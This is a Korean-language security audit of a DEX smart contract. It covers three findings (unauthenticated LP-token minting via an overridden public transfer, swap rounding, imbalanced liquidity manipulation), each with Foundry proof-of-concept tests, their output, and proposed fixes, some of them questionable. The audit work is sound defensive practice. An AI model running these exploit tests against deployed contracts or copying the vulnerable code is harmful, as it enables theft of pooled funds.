# 김지우

## public transfer & mint LP token

****critical (공격 파급력: High, 공격 난이도: Low)****

```solidity
function transfer(address to, uint256 lpAmount) override public returns (bool){
        _mint(to, lpAmount);
        return true;
    }
```

이번에도 ERC20컨트랙트를 상속하고 있는 DEX컨트랙트에서 transfer함수를 오버라이딩해서 _mint함수를 호출하고 있고, 별도의 검증은 없고, public 가시성 지정자로 설정해 놨다.

#### PoC

```solidity
function testTransferVisibility() external {
    vm.startPrank(user1);
    dex.transfer(address(this), 1000 ether);
    uint amount = dex.balanceOf(address(this));
    console.log("balanceOf user1's LPtoken: %d", amount);
    amount = dex.totalSupply();
    console.log("amountOf LPtoken totalSupply: %d", amount);
    vm.stopPrank();
    assertTrue(!(amount == 1000 ether), "testTransferVisibility Error");
}
```

```solidity
[FAIL. Reason: Assertion failed.] testTransferVisibility() (gas: 73950)
Logs:
  balanceOf user1's LPtoken: 1000000000000000000000
  amountOf LPtoken totalSupply: 1000000000000000000000
  Error: testTransferVisibility Error
  Error: Assertion Failed
```

#### 해결방안

transfer함수에서 _mint함수를 호출한다는 점, _mint함수를 호출하는 transfer함수가 가시성 지정자가 public이고, 별도의 인증이 없다는 점이 문제이다.

그렇기때문에 transfer함수를 오버라이딩 하지 않고, _mint함수를 호출해서 토큰을 민팅하는 방식으로 고치면 된다.

## **swap small amount round down**

**Informational (파급력: Low, 공격 난이도: Low)**

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outputAmount){
    require((tokenXAmount>0 && tokenYAmount==0) || (tokenXAmount==0 && tokenYAmount>0));
    
    uint X;
    uint Y;
    (X,Y)=update();

    require(X>0 && Y>0);

    uint input_amount;
    uint output_amount;
    ERC20 input;
    ERC20 output;

    // swap, fee : 0.1%
    if (tokenXAmount>0){ // swap Y token
        input=_tokenX; 
        output=_tokenY;
        input_amount=tokenXAmount;
        output_amount=Y*(tokenXAmount*999/1000)/(X+(tokenXAmount*999/1000));
    }
    else { // swap X token
        input=_tokenY;
        output=_tokenX;
        input_amount=tokenYAmount;
        output_amount=X*(tokenYAmount*999/1000)/(Y+(tokenYAmount*999/1000));
    }

    // revert
    require(output_amount>=tokenMinimumOutputAmount);
    
    input.transferFrom(msg.sender, address(this), input_amount); //전송
    output.transfer(msg.sender, output_amount);                  //수신   
    
    return output_amount;
}
```

swap을 할 때 수수료를 부과한 tokenAmount를 사용하기 때문에 수수료를 부과하는 과정에서 round down이 생긴다.

#### PoC

```solidity
function testSmallSwapRoundDown() external {
    uint lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
    uint output = dex.swap(999 wei, 0, 0);
    console.log("output: %d", output);
}
```

```solidity
[PASS] testSmallSwapRoundDown() (gas: 194114)
Logs:
  output: 997
```

#### 해결방안

```solidity
function swap(uint256 tokenXAmount, uint256 tokenYAmount, uint256 tokenMinimumOutputAmount) external returns (uint256 outputAmount){
    require((tokenXAmount>0 && tokenYAmount==0) || (tokenXAmount==0 && tokenYAmount>0));
    
    uint X;
    uint Y;
    (X,Y)=update();

    require(X>0 && Y>0);

    uint input_amount;
    uint output_amount;
    ERC20 input;
    ERC20 output;

    // swap, fee : 0.1%
    if (tokenXAmount>0){ // swap Y token
        input=_tokenX; 
        output=_tokenY;
        input_amount=tokenXAmount;
        output_amount=Y*((tokenXAmount * 10 ** 18)*999/1000)/((X * 10 ** 18)+((tokenXAmount * 10 ** 18)*999/1000));
    }
    else { // swap X token
        input=_tokenY;
        output=_tokenX;
        input_amount=tokenYAmount;
        output_amount=X*(tokenYAmount*999/1000)/(Y+(tokenYAmount*999/1000));
    }

    // revert
    require(output_amount>=tokenMinimumOutputAmount);
    
    input.transferFrom(msg.sender, address(this), input_amount); //전송
    output.transfer(msg.sender, output_amount);                  //수신   
    
    return output_amount;
}
```

ouput_amount를 계산할 때 자릿수를 올려줘서 round down 되는 값을 최대한 보정해준다.

## AddLiquidity imbalance input

**medium (파급력: medium, 공격 난이도: Medium)**

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256 LPTokenAmount){
    require(tokenXAmount>0 && tokenYAmount>0);
    require(_tokenX.allowance(msg.sender, address(this))>=tokenXAmount,"ERC20: insufficient allowance");
    require(_tokenY.allowance(msg.sender, address(this))>=tokenYAmount,"ERC20: insufficient allowance");
    require(_tokenX.balanceOf(msg.sender)>=tokenXAmount,"ERC20: transfer amount exceeds balance");
    require(_tokenY.balanceOf(msg.sender)>=tokenYAmount,"ERC20: transfer amount exceeds balance");

    uint lpToken; 
    uint X;
    uint Y;

    if (liquiditySum==0){
        lpToken=Math.sqrt(tokenXAmount*tokenYAmount); //initial token amount
    }
    else {
        (X,Y)=update();
        
        // 기존 토큰에 대한 새 토큰의 비율로 계산
        uint liquidityX=liquiditySum*tokenXAmount/X;
        uint liquidityY=liquiditySum*tokenYAmount/Y;
        lpToken=(liquidityX<liquidityY)?liquidityX:liquidityY;
    }

    require(lpToken>=minimumLPTokenAmount);

    liquiditySum+=lpToken;
    liquidityUser[msg.sender]+=lpToken;

    _tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    _tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    transfer(msg.sender, lpToken);
    
    update();

    return lpToken;
}
```

addLiquidity를 할 때 imbalance한 tokenAmount가 들어오더라도 풀에 집어 넣어버리기 때문에 풀의 균형이 깨질 수 있다.

#### PoC

```solidity
function testManyETH() external {
    dex.addLiquidity(4000000 ether, 1000 ether, 0);
    vm.startPrank(user1);
    uint lp = dex.addLiquidity(8000000 ether, 1 wei, 0);
    uint outputUSDC = dex.swap(0, 1000 ether, 0);
    console.log("outputUSDC: %d", outputUSDC);
    console.log("1000*4000: %d", 1000 * 4000 ether);
    vm.stopPrank();
}
```

```solidity
[PASS] testManyETH() (gas: 279843)
Logs:
  outputUSDC: 5996998499249624812403203
  1000*4000: 4000000000000000000000000
```

1000 ETH를 최대한 이득을 보면서 swap을 하기 위해서 imbalance하게 USDC를 많이 넣어서 ETH의 가치를 올린다음 swap으로 차익을 보는 방법이다.

#### 해결방안

```solidity
function addLiquidity(uint256 tokenXAmount, uint256 tokenYAmount, uint256 minimumLPTokenAmount) external returns (uint256 LPTokenAmount){
    require(tokenXAmount>0 && tokenYAmount>0);
    require(_tokenX.allowance(msg.sender, address(this))>=tokenXAmount,"ERC20: insufficient allowance");
    require(_tokenY.allowance(msg.sender, address(this))>=tokenYAmount,"ERC20: insufficient allowance");
    require(_tokenX.balanceOf(msg.sender)>=tokenXAmount,"ERC20: transfer amount exceeds balance");
    require(_tokenY.balanceOf(msg.sender)>=tokenYAmount,"ERC20: transfer amount exceeds balance");

    uint lpToken; 
    uint X;
    uint Y;

    if (liquiditySum==0){
        lpToken=Math.sqrt(tokenXAmount*tokenYAmount); //initial token amount
    }
    else {
        (X,Y)=update();
        
        // 기존 토큰에 대한 새 토큰의 비율로 계산
        uint liquidityX=liquiditySum*tokenXAmount/X;
        uint liquidityY=liquiditySum*tokenYAmount/Y;
        lpToken=(liquidityX<liquidityY)?liquidityX:liquidityY;
        if(lpToken == liquidityY){
            tokenXAmount = X * tokenYAmount / Y;
        }else{
            tokenYAmount = Y * tokenXAmount / X;
        }
    }

    require(lpToken>=minimumLPTokenAmount);

    liquiditySum+=lpToken;
    liquidityUser[msg.sender]+=lpToken;

    _tokenX.transferFrom(msg.sender, address(this), tokenXAmount);
    _tokenY.transferFrom(msg.sender, address(this), tokenYAmount);
    transfer(msg.sender, lpToken);
    
    update();

    return lpToken;
}
```

```solidity
[PASS] testManyETH() (gas: 280036)
Logs:
  outputUSDC: 1998999499749874937469733
  1000*4000: 4000000000000000000000000
```

풀의 환경을 조작할 수 없기 때문에 1000 ETH로 USDC를 바꾼 금액이 확연히 낮아진다.
